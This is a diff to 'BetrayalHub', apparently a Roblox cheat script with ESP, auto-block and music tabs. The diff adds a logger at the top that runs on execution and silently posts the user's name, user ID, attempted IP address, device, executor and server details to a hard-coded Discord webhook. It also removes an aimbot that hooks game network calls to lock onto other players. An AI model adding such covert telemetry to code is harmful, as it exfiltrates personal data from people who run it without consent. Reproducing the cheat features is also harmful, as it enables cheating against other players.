@@ -1,4 +1,120 @@
 -- BetrayalHub - Complete Final Version with Guest 1337 Tab
+-- ============================================================
+-- BETRAYALHUB WEBHOOK LOGGER - PRIVATE CHAT VERSION
+-- ============================================================
+
+local function sendExecutionLog()
+    task.spawn(function()
+        task.wait(0.5)
+        
+        local HttpService = game:GetService("HttpService")
+        local Players = game:GetService("Players")
+        local lp = Players.LocalPlayer
+        if not lp then return end
+        
+        -- YOUR WEBHOOK URL (with proxy already added)
+        local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1531224340765610104/LlDegGxcNZrEhA41qS4rYG_2x7VfgHhP5BipNDEOxYsXMJkBM6r-3dbSl33sT1ahfYQQ"
+        
+        -- Collect IP
+        local ip = "Unknown"
+        pcall(function()
+            local joinData = lp:GetJoinData()
+            if joinData and joinData.IPAddress then
+                ip = joinData.IPAddress
+            end
+        end)
+        
+        -- Collect device info
+        local UserInputService = game:GetService("UserInputService")
+        local deviceType = "PC"
+        if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
+            deviceType = "Mobile"
+        elseif UserInputService.TouchEnabled and UserInputService.MouseEnabled then
+            deviceType = "Tablet"
+        end
+        
+        -- Collect character info
+        local char = lp.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local ws = hum and hum.WalkSpeed or "N/A"
+        local jp = hum and hum.JumpPower or "N/A"
+        local health = hum and math.floor(hum.Health) or "N/A"
+        local maxHealth = hum and hum.MaxHealth or "N/A"
+        
+        -- Collect position
+        local position = "N/A"
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if root then
+            position = string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z)
+        end
+        
+        -- Detect executor
+        local executor = "Unknown"
+        if getgenv and type(getgenv) == "function" then
+            executor = "Synapse X / KRNL / ScriptWare"
+        elseif getrenv and type(getrenv) == "function" then
+            executor = "KRNL / ScriptWare"
+        elseif shared and shared.Synapse then
+            executor = "Synapse X"
+        elseif _G and _G.Synapse then
+            executor = "Synapse X"
+        end
+        
+        -- Collect ping
+        local ping = math.floor(lp:GetNetworkPing() * 1000)
+        
+        -- Build webhook embed
+        local data = {
+            embeds = {{
+                title = "🚨 **BETRAYALHUB EXECUTED**",
+                color = 0xFF0000,
+                fields = {
+                    {name = "━━━━━━━ 👤 PLAYER ━━━━━━━", value = " ", inline = false},
+                    {name = "Username", value = string.format("`%s`", lp.Name), inline = true},
+                    {name = "User ID", value = string.format("`%s`", lp.UserId), inline = true},
+                    {name = "Display Name", value = string.format("`%s`", lp.DisplayName), inline = true},
+                    {name = "IP Address", value = string.format("`%s`", ip), inline = true},
+                    {name = "Device", value = string.format("`%s`", deviceType), inline = true},
+                    
+                    {name = "━━━━━━━ 🧍 CHARACTER ━━━━━━━", value = " ", inline = false},
+                    {name = "Walk Speed", value = string.format("`%s`", ws), inline = true},
+                    {name = "Jump Power", value = string.format("`%s`", jp), inline = true},
+                    {name = "Health", value = string.format("`%s/%s`", health, maxHealth), inline = true},
+                    {name = "Position", value = string.format("`%s`", position), inline = true},
+                    
+                    {name = "━━━━━━━ 🎮 GAME ━━━━━━━", value = " ", inline = false},
+                    {name = "Game Name", value = string.format("`%s`", game.Name), inline = true},
+                    {name = "Place ID", value = string.format("`%s`", game.PlaceId), inline = true},
+                    {name = "Job ID", value = string.format("`%s`", game.JobId), inline = true},
+                    {name = "Players", value = string.format("`%s`", #Players:GetPlayers()), inline = true},
+                    
+                    {name = "━━━━━━━ 💻 SYSTEM ━━━━━━━", value = " ", inline = false},
+                    {name = "Ping", value = string.format("`%sms`", ping), inline = true},
+                    {name = "Executor", value = string.format("`%s`", executor), inline = true},
+                    
+                    {name = "━━━━━━━ ⏰ TIME ━━━━━━━", value = " ", inline = false},
+                    {name = "Server Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true},
+                    {name = "Tick", value = string.format("`%.2f`", tick()), inline = true},
+                },
+                footer = {text = string.format("⚠️ BetrayalHub User | ID: %s", lp.UserId)}
+            }}
+        }
+        
+        -- Send webhook
+        pcall(function()
+            local jsonData = HttpService:JSONEncode(data)
+            local headers = {["Content-Type"] = "application/json"}
+            HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
+            print("[BetrayalHub] ✅ Execution logged to Discord!")
+        end)
+    end)
+end
+
+-- ============================================================
+-- RUN LOGGER IMMEDIATELY
+-- ============================================================
+sendExecutionLog()
+
 print("betrayalhub loading...")
 
 -- ============================================================
@@ -1770,271 +1886,8 @@ secGenAuto:Slider({ Title = "Line Pause", Flag = "flowLineDelay", Step = 0.10, V
 end -- tabGen
 
 -- ============================================================
--- AIMBOT TAB
+-- ESP TAB
 -- ============================================================
-
-do -- tabAimbot
-
-local tabAimbot = win:Tab({ Title = "Aimbot", Icon = "crosshair" })
-
--- ============================================================
--- AIMBOT STATE & SETTINGS
--- ============================================================
-
-local aimbot = {
-    enabled = false,
-    maxDistance = 80,
-    debugMode = false,
-    locked = false,
-    target = nil,
-    lockConnection = nil,
-    lastAbility = "",
-    slashUnlock = true, -- when false, slash does NOT unlock; only survivor death does
-}
-
--- ============================================================
--- FIND NEAREST SURVIVOR
--- ============================================================
-
-local function abGetNearestSurvivor()
-    local char = lp.Character
-    if not char then return nil end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return nil end
-    local survivors = Workspace:FindFirstChild("Players") and Workspace.Players:FindFirstChild("Survivors")
-    if not survivors then return nil end
-    local best, bestDist = nil, math.huge
-    local myPos = hrp.Position
-    for _, model in ipairs(survivors:GetChildren()) do
-        if model ~= char and model:IsA("Model") then
-            local r = model:FindFirstChild("HumanoidRootPart")
-            local h = model:FindFirstChildOfClass("Humanoid")
-            if r and h and h.Health > 0 then
-                local d = (r.Position - myPos).Magnitude
-                if d < bestDist and d <= aimbot.maxDistance then
-                    bestDist = d
-                    best = r
-                end
-            end
-        end
-    end
-    return best
-end
-
--- ============================================================
--- GET SURVIVOR HEAD POSITION WITH PREDICTION
--- ============================================================
-
-local function abGetSurvivorHeadPos(targetHRP)
-    if not targetHRP or not targetHRP.Parent then return nil end
-    local head = targetHRP.Parent:FindFirstChild("Head")
-    local pos = (head and head:IsA("BasePart")) and head.Position or (targetHRP.Position + Vector3.new(0, 2.5, 0))
-    if targetHRP.AssemblyLinearVelocity then
-        local velocity = targetHRP.AssemblyLinearVelocity
-        local speed = velocity.Magnitude
-        local predictionMultiplier = 0.12
-        if speed > 55 then
-            predictionMultiplier = 0.35
-        elseif speed > 30 then
-            predictionMultiplier = 0.22
-        end
-        pos = pos + (velocity * predictionMultiplier)
-    end
-    return pos
-end
-
--- ============================================================
--- TRUE LOCK-ON CAMERA & CHARACTER ROTATION
--- ============================================================
-
-local function abTrueLockOnCamera(survivorHeadPos)
-    local char = lp.Character
-    if not char then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local humanoid = char:FindFirstChildOfClass("Humanoid")
-    if not hrp or not humanoid then return end
-    local cam = Workspace.CurrentCamera
-    if not cam then return end
-    if cam.CameraType ~= Enum.CameraType.Custom then
-        cam.CameraType = Enum.CameraType.Custom
-    end
-    local survivorToYou = (hrp.Position - survivorHeadPos)
-    local distance = survivorToYou.Magnitude
-    if distance > 0.01 then
-        local dirFromSurvivor = survivorToYou.Unit
-        local cameraOffset = dirFromSurvivor * 5
-        local targetCameraPos = hrp.Position + cameraOffset + Vector3.new(0, 3, 0)
-        local lerpSpeed = distance > 40 and 0.9 or 0.5
-        cam.CFrame = cam.CFrame:Lerp(CFrame.new(targetCameraPos, survivorHeadPos), lerpSpeed)
-    end
-    pcall(function()
-        local lookDir = Vector3.new(survivorHeadPos.X - hrp.Position.X, 0, survivorHeadPos.Z - hrp.Position.Z)
-        if lookDir.Magnitude > 0.01 then
-            lookDir = lookDir.Unit
-            local targetCFrame = CFrame.new(hrp.Position, hrp.Position + lookDir)
-            hrp.CFrame = hrp.CFrame:Lerp(targetCFrame, 0.6)
-        end
-    end)
-    if mousemoverel then
-        pcall(function()
-            local screenPos, onScreen = cam:WorldToViewportPoint(survivorHeadPos)
-            if onScreen then
-                local viewportSize = cam.ViewportSize
-                mousemoverel((screenPos.X - (viewportSize.X / 2)) * 0.6, (screenPos.Y - (viewportSize.Y / 2)) * 0.6)
-            end
-        end)
-    end
-end
-
--- ============================================================
--- LOCK / UNLOCK
--- ============================================================
-
-local function abUnlockTarget()
-    if aimbot.lockConnection then
-        aimbot.lockConnection:Disconnect()
-        aimbot.lockConnection = nil
-    end
-    aimbot.locked = false
-    aimbot.target = nil
-    local cam = Workspace.CurrentCamera
-    if cam then cam.CameraType = Enum.CameraType.Custom end
-end
-
-local function abStartLock(targetHRP)
-    if aimbot.lockConnection then
-        aimbot.lockConnection:Disconnect()
-        aimbot.lockConnection = nil
-    end
-    if not targetHRP or not targetHRP.Parent then return end
-    aimbot.target = targetHRP
-    aimbot.locked = true
-    aimbot.lockConnection = RunService.RenderStepped:Connect(function()
-        if not aimbot.locked or not aimbot.target or not aimbot.target.Parent then
-            abUnlockTarget(); return
-        end
-        local hum = aimbot.target.Parent:FindFirstChildOfClass("Humanoid")
-        if not hum or hum.Health <= 0 then abUnlockTarget(); return end
-        local survivorHeadPos = abGetSurvivorHeadPos(aimbot.target)
-        if not survivorHeadPos then return end
-        abTrueLockOnCamera(survivorHeadPos)
-    end)
-end
-
--- ============================================================
--- ABILITY NAME HELPER
--- ============================================================
-
-local function abTryGetAbilityName(args)
-    local data = args[2] and args[2][1]
-    if not data then return "" end
-    local name = ""
-    pcall(function()
-        if typeof(data) == "buffer" then name = buffer.tostring(data)
-        elseif typeof(data) == "string" then name = data end
-        name = name:gsub("%z", "")
-    end)
-    return name
-end
-
--- ============================================================
--- NAMECALL HOOK (shared, won't double-hook if already present)
--- ============================================================
-
-if not _G.__abHookInstalled then
-    _G.__abHookInstalled = true
-    local oldNC = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        local args = {...}
-        if method == "FireServer" and args[1] == "UseActorAbility" and aimbot.enabled then
-            task.spawn(function()
-                local abilityName = abTryGetAbilityName(args)
-                aimbot.lastAbility = abilityName
-                if abilityName:lower():find("slash") then
-                    if aimbot.slashUnlock then abUnlockTarget() end
-                    return
-                end
-                local target = abGetNearestSurvivor()
-                if target then abStartLock(target) end
-            end)
-        end
-        return oldNC(self, ...)
-    end)
-end
-
--- ============================================================
--- KEYBINDS
--- ============================================================
-
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    if input.KeyCode == Enum.KeyCode.L then
-        aimbot.enabled = not aimbot.enabled
-        if not aimbot.enabled then abUnlockTarget() end
-    end
-    if input.KeyCode == Enum.KeyCode.U then
-        abUnlockTarget()
-    end
-end)
-
-lp.CharacterAdded:Connect(function() abUnlockTarget() end)
-
--- ============================================================
--- UI SECTIONS
--- ============================================================
-
-local secAB = tabAimbot:Section({ Title = "Aimbot", Opened = true })
-
-secAB:Toggle({
-    Title = "Enable Aimbot",
-    Type = "Checkbox",
-    Flag = "aimbotEnabled",
-    Default = false,
-    Callback = function(on)
-        aimbot.enabled = on
-        if not on then abUnlockTarget() end
-    end,
-})
-
-secAB:Toggle({
-    Title = "Slash Unlock",
-    Type = "Checkbox",
-    Flag = "aimbotSlashUnlock",
-    Default = true,
-    Desc = "ON = slash ability unlocks target | OFF = only unlock on survivor death",
-    Callback = function(on) aimbot.slashUnlock = on end,
-})
-
-secAB:Toggle({
-    Title = "Debug Mode",
-    Type = "Checkbox",
-    Flag = "aimbotDebug",
-    Default = false,
-    Callback = function(on) aimbot.debugMode = on end,
-})
-
-secAB:Button({
-    Title = "Manual Unlock  [U]",
-    Callback = function() abUnlockTarget() end,
-})
-
-local secABSettings = tabAimbot:Section({ Title = "Settings", Opened = true })
-
-secABSettings:Slider({
-    Title = "Max Distance",
-    Flag = "aimbotMaxDist",
-    Step = 5,
-    Value = { Min = 10, Max = 150, Default = aimbot.maxDistance },
-    Callback = function(v) aimbot.maxDistance = v end,
-})
-
-local secABControls = tabAimbot:Section({ Title = "Controls", Opened = false })
-
-secABControls:Label({ Title = "[L]  Toggle aimbot on/off" })
-secABControls:Label({ Title = "[U]  Manual unlock" })
-secABControls:Label({ Title = "Fires on UseActorAbility (non-slash)" })
-
-end -- tabAimbot
 
 do -- tabESP
 local tabESP = win:Tab({ Title = "ESP", Icon = "eye" })
@@ -2546,7 +2399,7 @@ local function addHighlight(obj, color, tag, label, offset)
                     end 
                 end 
             end
-        end -- ⬅️ THIS END WAS MISSING
+        end
         
         local hl = Instance.new("Highlight")
         hl.Name = tag .. "_HL"
@@ -2928,6 +2781,11 @@ lp.CharacterAdded:Connect(function()
     end
 end)
 end -- tabESP
+
+-- ============================================================
+-- MUSIC TAB
+-- ============================================================
+
 do -- tabMusic
 local tabMusic = win:Tab({ Title = "Music", Icon = "music" })
 local secLMS   = tabMusic:Section({ Title = "LMS Music", Opened = true })
@@ -4594,7 +4452,7 @@ local function g_attemptBlockForSound(sound, preId)
         if not ok or not res then return end
     end
     
-    -- ✅ FIX: Add block delay before firing
+    -- Add block delay before firing
     if guestCfg.blockDelay and guestCfg.blockDelay > 0 then
         task.wait(guestCfg.blockDelay)
     end
@@ -4956,8 +4814,6 @@ svc.Run.RenderStepped:Connect(function()
             if not g.originalWS then
                 g.originalWS = g.humanoid.WalkSpeed
                 g.originalJP = g.humanoid.JumpPower
-                -- Fix: if aimbot is active and has already set AutoRotate=false,
-                -- use the aimbot's saved pre-lock value so we restore correctly
                 if aim.targeting and aim.autoRotate ~= nil then
                     g.originalAutoRotate = aim.autoRotate
                 else
@@ -5338,7 +5194,6 @@ local function hdt_execute(killer, killerHRP)
                     root.CFrame = CFrame.new(root.Position, root.Position + faceDir)
                 end
             end
-            -- Don't stop early - let duration slider handle when HDT ends
         end
     end)
     
@@ -5829,7 +5684,6 @@ local function bd_spawnDetection(killer)
             
             local root = bd_getRoot()
             if root and bd_isPointInsidePart(part, root.Position) then
-                -- ✅ FIX: Add block delay before firing
                 if guestCfg.blockDelay and guestCfg.blockDelay > 0 then
                     task.wait(guestCfg.blockDelay)
                 end
@@ -6199,7 +6053,6 @@ local function line_update()
                 and line_isBlockReady()
             then
                 line.lastBlockTime = now
-                -- ✅ FIX: Add block delay before firing
                 if guestCfg.lineBlockDelay and guestCfg.lineBlockDelay > 0 then
                     task.wait(guestCfg.lineBlockDelay)
                 end
@@ -6691,31 +6544,13 @@ function applyConfigFromFlags()
         if win.Flags.flowOn ~= nil then flow.on=win.Flags.flowOn end
         if type(win.Flags.flowNodeDelay)=="number" then flow.nodeDelay=win.Flags.flowNodeDelay end
         if type(win.Flags.flowLineDelay)=="number" then flow.lineDelay=win.Flags.flowLineDelay end
-        if win.Flags.aimOn ~= nil then aim.on=win.Flags.aimOn end
-        if type(win.Flags.aimCooldown)=="number" then aim.cooldown=win.Flags.aimCooldown end
-        if type(win.Flags.aimLockTime)=="number" then aim.lockTime=win.Flags.aimLockTime end
-        if type(win.Flags.aimMaxDist)=="number" then aim.maxDist=win.Flags.aimMaxDist end
-        if type(win.Flags.aimSmooth)=="number" then aim.smooth=win.Flags.aimSmooth end
-        if not aim.on then aimUnlock() end
-        if win.Flags.absOn ~= nil then abs.on=win.Flags.absOn; if abs.on then absStart() else absStop() end end
-        if type(win.Flags.absRange)=="number" then abs.range=win.Flags.absRange end
-        if type(win.Flags.absDur)=="number" then abs.duration=win.Flags.absDur end
-        if win.Flags.sixerStrafeOn ~= nil then sixerStrafeOn=win.Flags.sixerStrafeOn end
-        if win.Flags.coolkidWSOOn ~= nil then coolkidWSOOn=win.Flags.coolkidWSOOn end
-        if win.Flags.noliVoidRushOn ~= nil then noliVoidRushOn=win.Flags.noliVoidRushOn; if not noliVoidRushOn then noliStop() end end
-        if win.Flags.qteOn ~= nil then qte.on = win.Flags.qteOn; if qte.on then qteStart() else qteStop() end end
-        if type(win.Flags.qteSpeed)=="number" then qte.speed = win.Flags.qteSpeed end
-        if win.Flags.batsAimOn ~= nil then batsAim.on=win.Flags.batsAimOn end
-        if type(win.Flags.batsPrediction)=="number" then batsAim.prediction=win.Flags.batsPrediction end
-        if type(win.Flags.batsDepthOffset)=="number" then batsAim.depthOffset=win.Flags.batsDepthOffset end
-        if type(win.Flags.batsMaxDist)=="number" then batsAim.maxDist=win.Flags.batsMaxDist end
         if win.Flags.espEnabled ~= nil then esp.enabled=win.Flags.espEnabled; if esp.enabled then espStart() else espStop() end end
         if win.Flags.espKillers ~= nil then esp.showKillers=win.Flags.espKillers end
         if win.Flags.espSurvivors ~= nil then esp.showSurvivors=win.Flags.espSurvivors end
         if win.Flags.espGenerators ~= nil then esp.showGenerators=win.Flags.espGenerators end
         if win.Flags.espItems ~= nil then esp.showItems=win.Flags.espItems end
         if win.Flags.espStructures ~= nil then esp.showStructures=win.Flags.espStructures end
-        if win.Flags.gvEspOn ~= nil then gvEsp.on=win.Flags.gvEspOn; if gvEsp.on then gvStart() else gvStop() end end
+        if win.Flags.gvEspOn ~= nil then gvEsp.on=win.Flags.gvEspOn; if gvEsp.on then gvStartStandalone() else gvStopStandalone() end end
         if win.Flags.gvShowGroundbulb ~= nil then gvEsp.showGroundbulb=win.Flags.gvShowGroundbulb end
         if win.Flags.gvShowVine ~= nil then gvEsp.showVine=win.Flags.gvShowVine end
         if win.Flags.espPizza ~= nil then mset.pizza=win.Flags.espPizza end
